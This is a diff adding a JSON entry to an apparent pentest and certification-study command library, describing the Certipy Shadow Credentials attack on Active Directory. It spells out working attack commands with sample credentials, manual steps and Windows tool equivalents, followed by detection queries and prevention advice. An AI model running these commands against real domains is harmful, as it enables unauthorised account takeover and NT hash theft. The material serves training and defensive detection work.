@@ -1,0 +1,102 @@
+{
+  "id": "ad-certipy-shadow-auto",
+  "name": "Certipy Shadow Auto - Automated Shadow Credentials Attack",
+  "command": "certipy shadow auto -u <user>@<domain> -p <pass> -account <target_account>",
+  "description": "Certipy shadow auto performs the full Shadow Credentials attack chain automatically: adds a KeyCredential to the target, requests a TGT using PKINIT, and recovers the NT hash. One command replaces the manual Whisker + Rubeus + PKINITtools chain. Works against users and computers where you have GenericWrite/GenericAll.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Credential Access",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "ly4k/Certipy; Shadow Credentials attack chain",
+  "tags": [
+    "certipy",
+    "shadow-credentials",
+    "pkinit",
+    "keycredentiallink",
+    "automated",
+    "genericwrite"
+  ],
+  "mitre": [
+    "T1649",
+    "T1557.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== ONE-COMMAND CHAIN ===\n  certipy shadow auto -u <user>@<domain> -p <pass> -account <target_account>\n  # Does everything:\n  # 1. Adds msDS-KeyCredentialLink to target\n  # 2. Requests TGT via PKINIT with the key\n  # 3. Performs UnPAC-the-hash to get NT hash\n  # 4. Cleans up the KeyCredentialLink\n\n=== MANUAL STEPS (what auto does internally) ===\n  # Step 1: Add key credential\n  certipy shadow add -u <user>@<domain> -p <pass> -account <target_account>\n  # Step 2: Authenticate with PKINIT\n  certipy shadow auth -u <user>@<domain> -p <pass> -account <target_account> -pfx <target>.pfx\n  # Step 3: Remove key credential (cleanup)\n  certipy shadow remove -u <user>@<domain> -p <pass> -account <target_account> -device-id <id>\n\n=== PREREQUISITES ===\n- GenericWrite or GenericAll over the target account\n- ADCS deployed (for PKINIT to work)\n- Target is not in Protected Users (blocks PKINIT for some configs)\n\n=== WINDOWS EQUIVALENT ===\n  # Whisker + Rubeus + PKINITtools:\n  Whisker.exe add /target:<target_account>\n  Rubeus.exe asktgt /user:<target_account> /certificate:<base64_cert> /password:<pass> /ptt\n  # Then use the ticket",
+  "examples": [
+    {
+      "label": "Full automated Shadow Credentials attack",
+      "command": "certipy shadow auto -u jdoe@corp.local -p Password123 -account svc_admin"
+    },
+    {
+      "label": "Manual - add key credential",
+      "command": "certipy shadow add -u jdoe@corp.local -p Password123 -account svc_admin"
+    },
+    {
+      "label": "Cleanup - remove key credential",
+      "command": "certipy shadow remove -u jdoe@corp.local -p Password123 -account svc_admin -device-id <id>"
+    }
+  ],
+  "references": [
+    {
+      "title": "Certipy Shadow Credentials",
+      "url": "https://github.com/ly4k/Certipy"
+    },
+    {
+      "title": "Shadow Credentials - Elad Shamir",
+      "url": "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-genericwrite-abuse",
+      "note": "GenericWrite is the prerequisite for Shadow Credentials.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-pkinit-getnthash",
+      "note": "PKINITtools getnthash is what certipy auto calls internally.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Shadow Credentials abuse the msDS-KeyCredentialLink attribute to register a new public key for PKINIT authentication. The target account then trusts this key for Kerberos pre-authentication, allowing the attacker to obtain a TGT and recover the NT hash.",
+    "prerequisites": "GenericWrite/GenericAll over the target account; ADCS deployed for PKINIT.",
+    "impact": "Full compromise of the target account (NT hash recovery); enables pass-the-hash or further lateral movement.",
+    "detection": "[MITRE T1649] msDS-KeyCredentialLink modification (Event 5136); PKINIT authentication from unexpected sources.",
+    "artifacts": "Event 5136 showing KeyCredentialLink change; Event 4768 with PKINIT pre-auth; certificate-based TGT request.",
+    "splunk_spl": "index=windows EventCode=5136 AttributeLDAPDisplayName=\"msDS-KeyCredentialLink\"\n| table _time, SubjectUserName, ObjectDN, OperationType",
+    "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"msDS-KeyCredentialLink\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-KeyCredentialLink\"\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType",
+    "sigma_rules": "win_security_shadow_credentials_keycredentiallink",
+    "prevention": "Monitor msDS-KeyCredentialLink changes; restrict GenericWrite permissions; use Protected Users group for sensitive accounts; audit PKINIT authentication events.",
+    "sources": [
+      "Certipy documentation",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Shadow Credentials - KeyCredentialLink modification",
+        "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-KeyCredentialLink\"\n| where OperationType == \"%%14674\"\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType\n| extend TargetAccount = extract(@\"CN=([^,]+)\", 1, ObjectDN)",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5136"
+        ],
+        "attack": [
+          "T1649",
+          "T1557.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Windows Hello for Business enrollment; WHfB key provisioning",
+        "tuning": "Whitelist WHfB enrollment service accounts; alert on any other KeyCredentialLink modification"
+      }
+    ]
+  }
+}
